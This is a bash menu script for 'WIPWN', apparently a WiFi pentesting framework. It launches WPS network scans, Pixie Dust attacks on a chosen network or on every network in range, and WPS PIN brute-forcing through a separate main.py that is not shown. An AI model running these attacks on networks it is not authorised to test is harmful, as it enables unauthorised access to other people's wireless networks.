#!/bin/bash
# WIPWN - Enhanced Menu Interface
# Created for easier usage without modifying core functionality

# Colors for better visualization
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
NC='\033[0m' # No Color

# Default settings
INTERFACE="wlan0"
BSSID=""
PIN_PREFIX=""
CURRENT_DIR=$(pwd)

# Banner display
show_banner() {
    clear
    echo -e "${BLUE}"
    echo "██╗    ██╗██╗██████╗ ██╗    ██╗███╗   ██╗"
    echo "██║    ██║██║██╔══██╗██║    ██║████╗  ██║"
    echo "██║ █╗ ██║██║██████╔╝██║ █╗ ██║██╔██╗ ██║"
    echo "██║███╗██║██║██╔═══╝ ██║███╗██║██║╚██╗██║"
    echo "╚███╔███╔╝██║██║     ╚███╔███╔╝██║ ╚████║"
    echo " ╚══╝╚══╝ ╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝"
    echo -e "${GREEN}=== WiFi Pentesting Framework ====${NC}"
    echo -e "${YELLOW}Enhanced Menu by User${NC}\n"
}

# Function to check if we have root/sudo
check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        echo -e "${RED}[!] This script must be run as root${NC}"
        exit 1
    fi
}

# Function to select wireless interface
select_interface() {
    echo -e "${CYAN}[*] Available wireless interfaces:${NC}"
    iw dev | grep Interface | awk '{print $2}'
    echo -e "${YELLOW}Current interface: $INTERFACE${NC}"
    echo -n -e "${GREEN}Enter interface name (leave blank to keep current): ${NC}"
    read new_interface
    if [ ! -z "$new_interface" ]; then
        INTERFACE=$new_interface
        echo -e "${BLUE}[+] Interface set to: $INTERFACE${NC}"
    fi
}

# Function to scan networks
scan_networks() {
    echo -e "${CYAN}[*] Scanning for networks with WPS...${NC}"
    echo -e "${YELLOW}[!] This might take some time...${NC}"
    sudo python $CURRENT_DIR/main.py -i $INTERFACE -s
    echo -e "${GREEN}[+] Scan complete${NC}"
    echo -e "${YELLOW}Press Enter to continue...${NC}"
    read
}

# Function to auto-attack all networks
auto_attack() {
    echo -e "${CYAN}[*] Starting automatic attack on all networks...${NC}"
    sudo python $CURRENT_DIR/main.py -i $INTERFACE -K
}

# Function to attack specific BSSID
attack_specific() {
    echo -n -e "${GREEN}Enter target BSSID (MAC address): ${NC}"
    read BSSID
    if [ ! -z "$BSSID" ]; then
        echo -e "${CYAN}[*] Starting attack on $BSSID...${NC}"
        sudo python $CURRENT_DIR/main.py -i $INTERFACE -b $BSSID -K
    else
        echo -e "${RED}[!] BSSID cannot be empty${NC}"
    fi
}

# Function for PIN bruteforce attack
pin_bruteforce() {
    echo -n -e "${GREEN}Enter target BSSID (MAC address): ${NC}"
    read BSSID
    if [ -z "$BSSID" ]; then
        echo -e "${RED}[!] BSSID cannot be empty${NC}"
        return
    fi
    
    echo -n -e "${GREEN}Enter PIN prefix (e.g. 1234, leave blank for full bruteforce): ${NC}"
    read PIN_PREFIX
    
    if [ ! -z "$PIN_PREFIX" ]; then
        echo -e "${CYAN}[*] Starting PIN bruteforce on $BSSID with prefix $PIN_PREFIX...${NC}"
        sudo python $CURRENT_DIR/main.py -i $INTERFACE -b $BSSID -B -p $PIN_PREFIX
    else
        echo -e "${CYAN}[*] Starting full PIN bruteforce on $BSSID...${NC}"
        sudo python $CURRENT_DIR/main.py -i $INTERFACE -b $BSSID -B
    fi
}

# Function to show help
show_help() {
    sudo python $CURRENT_DIR/main.py --help
    echo -e "${YELLOW}Press Enter to continue...${NC}"
    read
}

# Main menu
main_menu() {
    while true; do
        show_banner
        echo -e "${CYAN}=== Current Settings ===${NC}"
        echo -e "${YELLOW}Interface: ${GREEN}$INTERFACE${NC}"
        if [ ! -z "$BSSID" ]; then
            echo -e "${YELLOW}Target BSSID: ${GREEN}$BSSID${NC}"
        fi
        echo
        
        echo -e "${CYAN}=== WIPWN Menu ===${NC}"
        echo -e "${BLUE}1.${NC} Select wireless interface"
        echo -e "${BLUE}2.${NC} Scan for WPS networks"
        echo -e "${BLUE}3.${NC} Auto-attack all networks (Pixie Dust)"
        echo -e "${BLUE}4.${NC} Attack specific BSSID (Pixie Dust)"
        echo -e "${BLUE}5.${NC} PIN bruteforce attack"
        echo -e "${BLUE}6.${NC} Show help / command options"
        echo -e "${RED}0.${NC} Exit"
        
        echo -n -e "${GREEN}Select an option: ${NC}"
        read option
        
        case $option in
            1) select_interface ;;
            2) scan_networks ;;
            3) auto_attack ;;
            4) attack_specific ;;
            5) pin_bruteforce ;;
            6) show_help ;;
            0) echo -e "${RED}Exiting...${NC}"; exit 0 ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

# Start the script
check_root
main_menu